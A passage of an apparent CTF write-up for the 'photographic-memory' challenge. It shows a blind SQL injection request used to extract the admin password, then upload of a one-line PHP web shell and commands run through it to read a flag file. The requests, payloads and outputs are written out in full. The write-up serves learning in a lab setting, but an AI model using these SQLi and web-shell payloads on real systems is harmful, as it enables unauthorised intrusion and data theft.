+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="n">Accept-Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="n">Content-Type</span><span class="p">:</span> <span class="n">application</span><span class="p">/</span><span class="n">x-www-form-urlencoded</span>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="n">Content-Length</span><span class="p">:</span> <span class="n">211</span>
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="n">Origin</span><span class="p">:</span> <span class="n">http</span><span class="p">://</span><span class="n">photographic-memory</span><span class="p">.</span><span class="n">ctf</span>
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="n">Referer</span><span class="p">:</span> <span class="n">http</span><span class="p">://</span><span class="n">photographic-memory</span><span class="p">.</span><span class="n">ctf</span><span class="p">/</span>
+<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="n">Cookie</span><span class="p">:</span> <span class="n">PHPSESSID</span><span class="p">=</span><span class="n">k2ip0nk80scvaubpv8u7a54bjg</span>
+<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="n">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="n">1</span>
+<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>
+<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a><span class="n">username</span><span class="p">=</span><span class="n">admin</span><span class="s1">&#39; AND SUBSTRING((CAST((SELECT&#39;</span><span class="n">m</span><span class="s1">&#39;%2bpasswd FROM users ORDER BY username OFFSET 0 ROWS FETCH FIRST 1 ROWS ONLY) AS NVARCHAR(4000))),§1§,1)=&#39;</span><span class="err">§</span><span class="n">m</span><span class="err">§</span><span class="s1">&#39; AND &#39;</span><span class="n">uNDi</span><span class="s1">&#39;=&#39;</span><span class="n">uNDi</span><span class="p">&amp;</span><span class="n">passwd</span><span class="p">=</span><span class="n">admin</span>
+</code></pre></div>
+<p>Allowing us to find the first flag:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>| 4    | 4  | a | 200 | false | false | 1773 | 1 |  |
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>|------|----|---|-----|-------|-------|------|---|--|
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>| 10   | 10 | a | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>| 125  | 35 | b | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>| 120  | 30 | b | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>| 207  | 27 | c | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>| 278  | 8  | d | 200 | false | false | 1773 | 1 |  |
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>| 282  | 12 | d | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>| 299  | 29 | d | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>| 289  | 19 | d | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>| 306  | 36 | d | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>| 369  | 9  | e | 200 | false | false | 1773 | 1 |  |
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>| 376  | 16 | e | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>| 452  | 2  | f | 200 | false | false | 1773 | 1 |  |
+<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>| 472  | 22 | f | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>| 545  | 5  | g | 200 | false | false | 1773 | 1 |  |
+<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>| 993  | 3  | l | 200 | false | false | 1773 | 1 |  |
+<a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>| 1081 | 1  | m | 200 | false | false | 1773 | 1 |  |
+<a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a>| 2363 | 23 | 0 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a>| 2454 | 24 | 1 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a>| 2443 | 13 | 1 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a>| 2464 | 34 | 1 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a>| 2535 | 15 | 2 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a>| 2540 | 20 | 2 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a>| 2548 | 28 | 2 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a>| 2627 | 17 | 3 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a>| 2631 | 21 | 3 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a>| 2801 | 11 | 5 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a>| 2827 | 37 | 5 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a>| 2887 | 7  | 6 | 200 | false | false | 1773 | 1 |  |
+<a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a>| 2894 | 14 | 6 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-32" name="__codelineno-15-32" href="#__codelineno-15-32"></a>| 2898 | 18 | 6 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-33" name="__codelineno-15-33" href="#__codelineno-15-33"></a>| 2911 | 31 | 6 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-34" name="__codelineno-15-34" href="#__codelineno-15-34"></a>| 2918 | 38 | 6 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-35" name="__codelineno-15-35" href="#__codelineno-15-35"></a>| 2996 | 26 | 7 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-36" name="__codelineno-15-36" href="#__codelineno-15-36"></a>| 3003 | 33 | 7 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-37" name="__codelineno-15-37" href="#__codelineno-15-37"></a>| 3182 | 32 | 9 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-38" name="__codelineno-15-38" href="#__codelineno-15-38"></a>| 3175 | 25 | 9 | 200 | false | false | 1774 | 1 |  |
+<a id="__codelineno-15-39" name="__codelineno-15-39" href="#__codelineno-15-39"></a>| 3336 | 6  | - | 200 | false | false | 1773 | 1 |  |
+</code></pre></div>
+<p>Following reorganization we got <code>flag-6dea5d162e36d23f0197c2db6971bd56</code>.</p>
+<h2 id="authentication">Authentication</h2>
+<p>Now that we have the first flag we tried to use it as a password since it was stored in the <code>passwd</code> field of the database.</p>
+<p>The first shot gave us an error then we realized that we had to put it in capital letters to authenticate as <code>admin</code>:</p>
+<p><img alt="Authentication as admin user" src="../res/nsec24/dashboard.png" /></p>
+<h2 id="file-upload">File upload</h2>
+<p>Once authenticated an upload feature is available. If you try to submit the form without any file, you get the following message:</p>
+<p><img alt="Access denied to path" src="../res/nsec24/folder-upload.png" /></p>
+<h2 id="remote-code-execution">Remote Code Execution</h2>
+<p>We decided to upload directly a <a href="https://www.pentestpartners.com/security-blog/the-tiniest-php-system-shell-ever/">very tiny</a> <code>PHP</code> reverse shell:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">POST</span> <span class="p">/</span><span class="n">dashboard</span><span class="p">.</span><span class="n">php</span> <span class="n">HTTP</span><span class="p">/</span><span class="n">1</span><span class="p">.</span><span class="n">1</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">Host</span><span class="p">:</span> <span class="n">photographic-memory</span><span class="p">.</span><span class="n">ctf</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="n">User-Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="p">/</span><span class="n">5</span><span class="p">.</span><span class="n">0</span> <span class="p">(</span><span class="n">X11</span><span class="p">;</span> <span class="n">Linux</span> <span class="n">x86_64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="n">109</span><span class="p">.</span><span class="n">0</span><span class="p">)</span> <span class="n">Gecko</span><span class="p">/</span><span class="n">20100101</span> <span class="n">Firefox</span><span class="p">/</span><span class="n">115</span><span class="p">.</span><span class="n">0</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="n">Accept</span><span class="p">:</span> <span class="n">text</span><span class="p">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="p">/</span><span class="n">xhtml</span><span class="p">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="p">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">9</span><span class="p">,</span><span class="n">image</span><span class="p">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="p">/</span><span class="n">webp</span><span class="p">,*/*;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">8</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="n">Accept-Language</span><span class="p">:</span> <span class="n">en-US</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">5</span>
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="n">Accept-Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="n">Content-Type</span><span class="p">:</span> <span class="n">multipart</span><span class="p">/</span><span class="n">form-data</span><span class="p">;</span> <span class="n">boundary</span><span class="p">=---------------------------</span><span class="n">62884936718515663351035206868</span>
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="n">Content-Length</span><span class="p">:</span> <span class="n">250</span>
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="n">Origin</span><span class="p">:</span> <span class="n">http</span><span class="p">://</span><span class="n">photographic-memory</span><span class="p">.</span><span class="n">ctf</span>
+<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="n">Referer</span><span class="p">:</span> <span class="n">http</span><span class="p">://</span><span class="n">photographic-memory</span><span class="p">.</span><span class="n">ctf</span><span class="p">/</span><span class="n">dashboard</span><span class="p">.</span><span class="n">php</span>
+<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="n">Cookie</span><span class="p">:</span> <span class="n">PHPSESSID</span><span class="p">=</span><span class="n">k2ip0nk80scvaubpv8u7a54bjg</span>
+<a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="n">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="n">1</span>
+<a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a>
+<a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a><span class="p">-----------------------------</span><span class="n">62884936718515663351035206868</span>
+<a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a><span class="n">Content-Disposition</span><span class="p">:</span> <span class="n">form-data</span><span class="p">;</span> <span class="n">name</span><span class="p">=</span><span class="s2">&quot;photo_memory&quot;</span><span class="p">;</span> <span class="n">filename</span><span class="p">=</span><span class="s2">&quot;shell.php&quot;</span>
+<a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a><span class="n">Content-Type</span><span class="p">:</span> <span class="n">application</span><span class="p">/</span><span class="n">x-php</span>
+<a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a>
+<a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a><span class="p">&lt;?=`$</span><span class="n">_GET</span><span class="p">[</span><span class="n">1</span><span class="p">]`?&gt;</span>
+<a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a>
+<a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a><span class="p">-----------------------------</span><span class="n">62884936718515663351035206868</span><span class="p">--</span>
+</code></pre></div>
+<p>Giving us remote code execution on the server <a href="http://photographic-memory.ctf/photo-memory-uploaded/admin/shell.php?1=id">http://photographic-memory.ctf/photo-memory-uploaded/admin/shell.php?1=id</a>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">uid</span><span class="p">=</span><span class="n">33</span><span class="p">(</span><span class="n">www-data</span><span class="p">)</span> <span class="n">gid</span><span class="p">=</span><span class="n">33</span><span class="p">(</span><span class="n">www-data</span><span class="p">)</span> <span class="n">groups</span><span class="p">=</span><span class="n">33</span><span class="p">(</span><span class="n">www-data</span><span class="p">)</span> 
+</code></pre></div>
+<p>After a very quick recon we identified that there was a <code>flag</code> file at the root (<code>/</code>) of the file system:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">GET</span> <span class="p">/</span><span class="n">photo-memory-uploaded</span><span class="p">/</span><span class="n">admin</span><span class="p">/</span><span class="n">shell</span><span class="p">.</span><span class="n">php</span><span class="k">?</span><span class="n">1</span><span class="p">=</span><span class="n">cat</span><span class="p">+/</span><span class="n">flag</span> <span class="n">HTTP</span><span class="p">/</span><span class="n">1</span><span class="p">.</span><span class="n">1</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="n">Host</span><span class="p">:</span> <span class="n">photographic-memory</span><span class="p">.</span><span class="n">ctf</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="n">User-Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="p">/</span><span class="n">5</span><span class="p">.</span><span class="n">0</span> <span class="p">(</span><span class="n">X11</span><span class="p">;</span> <span class="n">Linux</span> <span class="n">x86_64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="n">109</span><span class="p">.</span><span class="n">0</span><span class="p">)</span> <span class="n">Gecko</span><span class="p">/</span><span class="n">20100101</span> <span class="n">Firefox</span><span class="p">/</span><span class="n">115</span><span class="p">.</span><span class="n">0</span>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="n">Accept</span><span class="p">:</span> <span class="n">text</span><span class="p">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="p">/</span><span class="n">xhtml</span><span class="p">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="p">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">9</span><span class="p">,</span><span class="n">image</span><span class="p">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="p">/</span><span class="n">webp</span><span class="p">,*/*;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">8</span>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="n">Accept-Language</span><span class="p">:</span> <span class="n">en-US</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">5</span>
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="n">Accept-Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="n">Cookie</span><span class="p">:</span> <span class="n">PHPSESSID</span><span class="p">=</span><span class="n">k2ip0nk80scvaubpv8u7a54bjg</span>
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="n">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="n">1</span>
+<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>
+<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>
+<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="n">HTTP</span><span class="p">/</span><span class="n">1</span><span class="p">.</span><span class="n">1</span> <span class="n">200</span> <span class="n">OK</span>
+<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="n">Date</span><span class="p">:</span> <span class="n">Sun</span><span class="p">,</span> <span class="n">19</span> <span class="n">May</span> <span class="n">2024</span> <span class="n">17</span><span class="p">:</span><span class="n">06</span><span class="p">:</span><span class="n">21</span> <span class="n">GMT</span>
+<a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a><span class="n">Server</span><span class="p">:</span> <span class="n">Apache</span><span class="p">/</span><span class="n">2</span><span class="p">.</span><span class="n">4</span><span class="p">.</span><span class="n">52</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a><span class="n">Content-Length</span><span class="p">:</span> <span class="n">44</span>
+<a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+<a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a><span class="n">Content-Type</span><span class="p">:</span> <span class="n">text</span><span class="p">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="p">=</span><span class="n">UTF</span><span class="p">-</span><span class="n">8</span>
+<a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a>
+<a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a><span class="n">FLAG</span><span class="p">-</span><span class="n">5e2338188e4ab1850dd5bf94c32c33c5</span> <span class="p">(</span><span class="n">2</span><span class="p">/</span><span class="n">2</span><span class="p">)</span>
+</code></pre></div>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="May 31, 2025 19:44:57 UTC">May 31, 2025</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      
+    
+  </body>
+</html>
